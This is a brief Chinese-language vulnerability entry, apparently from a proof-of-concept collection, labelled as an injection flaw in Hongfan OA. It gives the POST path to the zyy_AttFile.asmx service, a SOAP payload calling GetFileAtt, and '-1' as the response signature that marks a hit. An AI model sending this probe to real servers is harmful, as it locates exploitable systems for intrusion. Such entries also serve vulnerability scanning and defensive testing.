# 红帆OA注入

红帆OA ｜ 其他 ｜ —
- **请求**：`POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></soap:Envelope>
```
- **响应特征**：-1